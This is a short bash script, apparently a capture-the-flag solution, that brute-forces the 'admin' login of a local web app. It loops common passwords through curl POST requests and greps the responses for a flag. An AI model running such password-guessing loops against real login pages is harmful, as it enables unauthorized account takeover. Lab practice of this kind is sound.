declare -a passwords

# passwords=(password password 123456 123456 123456 123456 123456 123456
# 123456 123456 password password password password password password
# 12345678 12345678 12345678 12345 12345678 12345 12345678 123456789
# qwerty abc123 qwerty 12345678 qwerty 12345678 qwerty 12345678
# abc123 qwerty abc123 qwerty 12345 football 12345 12345
# monkey monkey 123456789 123456789 123456789 qwerty 123456789 111111
# 1234567 letmein 111111 1234 football 1234567890 letmein 1234567
# letmein dragon 1234567 baseball 1234 1234567 1234567 sunshine
# trustno1 111111 iloveyou dragon 1234567 princess football qwerty
#  dragon baseball adobe123 football baseball 1234 iloveyou iloveyou
#  baseball iloveyou 123123 1234567 welcome login admin princess
#  111111 trustno1 admin monkey 1234567890 welcome welcome admin
#  iloveyou 1234567 1234567890 letmein abc123 solo monkey welcome
#  master sunshine letmein abc123 111111 abc123 login 666666
#  sunshine master photoshop 111111 1qaz2wsx admin abc123 abc123
#  ashley 123123 1234 mustang dragon 121212 starwars football
#  bailey welcome monkey access master flower 123123 123123
#  passw0rd shadow shadow shadow monkey passw0rd dragon monkey
#  shadow ashley sunshine master letmein dragon passw0rd 654321
#  123123 football 12345 michael login sunshine master
#  654321 jesus password1 superman princess master hello charlie
#  superman michael princess 696969 qwertyuiop hottie freedom aa123456
#  qazwsx ninja azerty 123123 solo loveme whatever donald
#  michael mustang trustno1 batman passw0rd zaq1zaq1 qazwsx password1
#  Football password1 000000 trustno1 starwars password1 trustno1 qwerty123)

 passwords=(password password 123456 shadow)

# echo ${passwords[*]}

for pwd in ${passwords[*]}
    do
        curl -X POST "http://localhost:8080/index.php?page=signin&username=admin&password=${pwd}&Login=Login#" | grep "flag" > file
    done
if [ -s ./file ]; then
        cat file
fi
